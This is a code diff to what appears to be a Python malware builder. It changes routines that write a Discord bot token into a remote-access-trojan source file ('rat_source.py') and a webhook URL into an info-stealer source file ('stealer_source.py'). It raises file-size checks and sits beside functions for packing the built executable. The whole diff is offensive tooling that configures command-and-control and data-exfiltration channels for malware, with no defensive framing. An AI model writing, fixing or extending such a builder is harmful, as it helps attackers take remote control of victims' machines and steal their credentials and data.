@@ -401,7 +401,7 @@ def safe_write_file(file_path, content, encoding="utf-8"):
                 print(f"{Fore.YELLOW}[!] Warning: Could not create backup of {file_path}: {str(backup_error)}{Style.RESET_ALL}")
         
         # Verify content length before writing
-        if len(content) < 10240 and file_path.endswith('.py'):  # Less than 10KB for Python files
+        if len(content) < 30720 and file_path.endswith('.py'):  # Less than 30KB for Python files
             print(f"{Fore.RED}[!] Warning: Content is suspiciously small ({len(content)} chars){Style.RESET_ALL}")
             
             # Check if original file exists and is larger
@@ -433,7 +433,7 @@ def safe_write_file(file_path, content, encoding="utf-8"):
         if os.path.exists(temp_file):
             # Verify the temp file is not truncated before replacing
             temp_size = os.path.getsize(temp_file)
-            if temp_size < 10240 and file_path.endswith('.py'):  # At least 10KB for Python files
+            if temp_size < 30720 and file_path.endswith('.py'):  # At least 30KB for Python files
                 print(f"{Fore.RED}[!] Warning: Generated file is suspiciously small ({temp_size} bytes){Style.RESET_ALL}")
                 
                 if os.path.exists(file_path):
@@ -460,7 +460,7 @@ def safe_write_file(file_path, content, encoding="utf-8"):
                     os.rename(temp_file, file_path)
                 
                 # Verify final file size
-                if os.path.getsize(file_path) < 10240 and file_path.endswith('.py'):  # At least 10KB for Python files
+                if os.path.getsize(file_path) < 30720 and file_path.endswith('.py'):  # At least 30KB for Python files
                     print(f"{Fore.RED}[!] Warning: Final file is suspiciously small ({os.path.getsize(file_path)} bytes){Style.RESET_ALL}")
                     
                     # Try to restore from backup if available
@@ -475,7 +475,7 @@ def safe_write_file(file_path, content, encoding="utf-8"):
                             shutil.copy2('main.py', file_path)
                             return True
                     
-                    return os.path.getsize(file_path) >= 10240  # Return success only if file is large enough
+                    return os.path.getsize(file_path) >= 30720  # Return success only if file is large enough
                     
                 return True
             except Exception as replace_error:
@@ -495,7 +495,6 @@ def safe_write_file(file_path, content, encoding="utf-8"):
         print(f"{Fore.RED}[!] Error writing to file {file_path}: {str(e)}{Style.RESET_ALL}")
         traceback.print_exc()
         return False
-
 def insert_token(token):
     """Insert the token into the rat_source.py file."""
     try:
@@ -503,9 +502,13 @@ def insert_token(token):
             print(f"{Fore.RED}[!] rat_source.py not found. Cannot insert token.{Style.RESET_ALL}")
             return False
             
+        # Create backup of original file
+        backup_file = "rat_source.py.bak"
+        shutil.copy2("rat_source.py", backup_file)
+            
         # Check file size before modification
         original_size = os.path.getsize("rat_source.py")
-        if original_size < 10240:  # Less than 10KB
+        if original_size < 30720:  # Less than 30KB
             print(f"{Fore.YELLOW}[!] Warning: rat_source.py is suspiciously small ({original_size} bytes){Style.RESET_ALL}")
             
             # Try to use main.py instead if it exists and is larger
@@ -522,79 +525,83 @@ def insert_token(token):
             content = f.read()
             
         # Check content length
-        if len(content) < 10240:  # Less than 10KB
+        if len(content) < 30720:  # Less than 30KB
             print(f"{Fore.YELLOW}[!] Warning: rat_source.py content is suspiciously small ({len(content)} chars){Style.RESET_ALL}")
         
         # Sanitize token - remove any quotes that might cause issues
         token = token.replace("'", "").replace('"', "")
         
-        # Properly identify the token line using a more robust regex pattern
-        token_pattern = re.compile(r'token\s*=\s*[\'"].*?[\'"]')
+        # Create new file with token
+        new_content = f"""token = '{token}'  # Discord bot token
+
+{content}"""
+        # Look for specific insertion points
         token_replaced = False
         
-        if token_pattern.search(content):
-            # Replace existing token
-            modified_content = token_pattern.sub(f"token = '{token}'", content)
-            token_replaced = True
-            print(f"{Fore.GREEN}[+] Token inserted successfully at existing location!{Style.RESET_ALL}")
-        else:
-            # If token line not found, insert after client declaration
-            client_pattern = re.compile(r'client\s*=\s*discord\.Client')
-            if client_pattern.search(content):
-                client_match = client_pattern.search(content)
-                client_line_end = client_match.end()
-                insert_position = content.find('\n', client_line_end) + 1
-                
-                modified_content = content[:insert_position] + f"token = '{token}'\n" + content[insert_position:]
-                token_replaced = True
-                print(f"{Fore.GREEN}[+] Token inserted successfully after client declaration!{Style.RESET_ALL}")
-            else:
-                # Last resort - append to the end of the file
-                modified_content = content + f"\ntoken = '{token}'\n"
-                token_replaced = True
-                print(f"{Fore.GREEN}[+] Token appended to the end of the file!{Style.RESET_ALL}")
+        # First approach: Look for existing token line
+        lines = content.splitlines()
+        token_line = f"token = '{token}'  # Discord bot token"
         
-        if token_replaced:
-            # Check if modified content is significantly smaller than original
-            if len(modified_content) < len(content) * 0.9:
-                print(f"{Fore.RED}[!] Warning: Modified content is significantly smaller than original!{Style.RESET_ALL}")
-                print(f"{Fore.RED}[!] Original: {len(content)} chars, Modified: {len(modified_content)} chars{Style.RESET_ALL}")
-                print(f"{Fore.RED}[!] Aborting token insertion to prevent data loss{Style.RESET_ALL}")
-                return False
+        for i, line in enumerate(lines):
+            if re.search(r'token\s*=', line):
+                lines[i] = token_line
+                token_replaced = True
+                print(f"{Fore.GREEN}[+] Token inserted at existing token line{Style.RESET_ALL}")
+                break
                 
-            # Write the modified content back to the file
-            result = safe_write_file("rat_source.py", modified_content)
-            
-            # Verify the file was written correctly
-            if result and os.path.exists("rat_source.py"):
-                new_size = os.path.getsize("rat_source.py")
-                if new_size < original_size * 0.9:
-                    print(f"{Fore.RED}[!] Warning: File size decreased significantly after token insertion!{Style.RESET_ALL}")
-                    print(f"{Fore.RED}[!] Original: {original_size} bytes, New: {new_size} bytes{Style.RESET_ALL}")
+        # Second approach: Insert after appdata line
+        if not token_replaced:
+            for i, line in enumerate(lines):
+                if "appdata = os.getenv" in line:
+                    lines.insert(i+1, token_line)
+                    token_replaced = True
+                    print(f"{Fore.GREEN}[+] Token inserted after appdata declaration{Style.RESET_ALL}")
+                    break
                     
-                    # Restore from backup if available
-                    backup_file = "rat_source.py.bak"
-                    if os.path.exists(backup_file):
-                        print(f"{Fore.YELLOW}[!] Restoring from backup{Style.RESET_ALL}")
-                        shutil.copy2(backup_file, "rat_source.py")
-                        
-                        # Try inserting token again, but more carefully
-                        with open("rat_source.py", "r", encoding="utf-8", errors="ignore") as f:
-                            content = f.read()
-                        
-                        # Just append the token at the end to be safe
-                        modified_content = content + f"\n\n# Token added by builder\ntoken = '{token}'\n"
-                        return safe_write_file("rat_source.py", modified_content)
+        # Third approach: Insert after client declaration
+        if not token_replaced:
+            for i, line in enumerate(lines):
+                if "client = discord.Client" in line:
+                    lines.insert(i+1, token_line)
+                    token_replaced = True
+                    print(f"{Fore.GREEN}[+] Token inserted after client declaration{Style.RESET_ALL}")
+                    break
+                    
+        # Last resort: Insert at beginning of file
+        if not token_replaced:
+            lines.insert(20, token_line)  # Insert after some imports
+            token_replaced = True
+            print(f"{Fore.GREEN}[+] Token inserted near beginning of file{Style.RESET_ALL}")
             
-            return result
-        else:
-            print(f"{Fore.RED}[!] Could not find a suitable location to insert token{Style.RESET_ALL}")
-            return False
-            
+        # Reconstruct the content
+        modified_content = "\n".join(lines)
+        
+        # Write the modified content back to the file
+        result = safe_write_file("rat_source.py", modified_content)
+        # Verify the file was written correctly
+        if result and os.path.exists("rat_source.py"):
+            new_size = os.path.getsize("rat_source.py")
+            if new_size < original_size * 0.9 and original_size > 30720:
+                print(f"{Fore.RED}[!] Warning: File size decreased significantly after token insertion!{Style.RESET_ALL}")
+                print(f"{Fore.RED}[!] Original: {original_size} bytes, New: {new_size} bytes{Style.RESET_ALL}")
+                
+                # Try a different approach - just append the token
+                with open("rat_source.py", "r", encoding="utf-8", errors="ignore") as f:
+                    content = f.read()
+                
+                modified_content = content + f"\n\n# Token added by builder\ntoken = '{token}'\n"
+                return safe_write_file("rat_source.py", modified_content)
+        
+        return result
     except Exception as e:
         print(f"{Fore.RED}[!] Error inserting token: {str(e)}{Style.RESET_ALL}")
-        traceback.print_exc()
-        return False
+        # Fallback method - direct append
+        try:
+            with open("rat_source.py", "a", encoding="utf-8", errors="ignore") as f:
+                f.write(f"\n\n# Emergency token insertion\ntoken = '{token}'\n")
+            return True
+        except:
+            return False
 
 def install_packers():
     import zipfile
@@ -797,7 +804,6 @@ def pack_executable(exe_path, packer=None):
     except Exception as e:
         print(f"{Fore.RED}[!] Failed to pack executable: {str(e)}{Style.RESET_ALL}")
         print(f"{Fore.YELLOW}[!] Continuing without packing...{Style.RESET_ALL}")
-
 def insert_webhook(webhook):
     """Insert the webhook URL into the stealer source code."""
     if not webhook:
@@ -814,23 +820,23 @@ def insert_webhook(webhook):
         webhook_pattern = re.compile(r'wbhk\s*=\s*[\'"].*?[\'"]')
         
         if webhook_pattern.search(content):
-            # Replace existing webhook
-            modified_content = webhook_pattern.sub(f"wbhk = '{webhook}'", content)
-            print(f"{Fore.GREEN}[+] Webhook replaced in existing location!{Style.RESET_ALL}")
+            # Replace existing webhook and add newline
+            modified_content = webhook_pattern.sub(f"\nwbhk = '{webhook}'", content)
+            print(f"{Fore.GREEN}[+] Webhook replaced in existing location with newline!{Style.RESET_ALL}")
         else:
             # Try to find a good location to insert
             lines = content.splitlines()
             insert_position = min(36, len(lines)) if len(lines) > 0 else 0
             
             if insert_position > 0:
-                lines.insert(insert_position, f"wbhk = '{webhook}'")
+                lines.insert(insert_position, "")  # Add blank line
+                lines.insert(insert_position + 1, f"wbhk = '{webhook}'")
                 modified_content = '\n'.join(lines)
-                print(f"{Fore.GREEN}[+] Webhook inserted at line {insert_position}!{Style.RESET_ALL}")
+                print(f"{Fore.GREEN}[+] Webhook inserted at line {insert_position} with newline!{Style.RESET_ALL}")
             else:
-                # If file is too short, append to the end
-                modified_content = content + f"\nwbhk = '{webhook}'\n"
-                print(f"{Fore.GREEN}[+] Webhook appended to the end of the file!{Style.RESET_ALL}")
-                
+                # If file is too short, append to the end with newline
+                modified_content = content + f"\n\nwbhk = '{webhook}'\n"
+                print(f"{Fore.GREEN}[+] Webhook appended to the end of the file with newline!{Style.RESET_ALL}")
         return safe_write_file("stealer_source.py", modified_content)
     except Exception as e:
         print(f"{Fore.RED}[!] Error inserting webhook: {str(e)}{Style.RESET_ALL}")
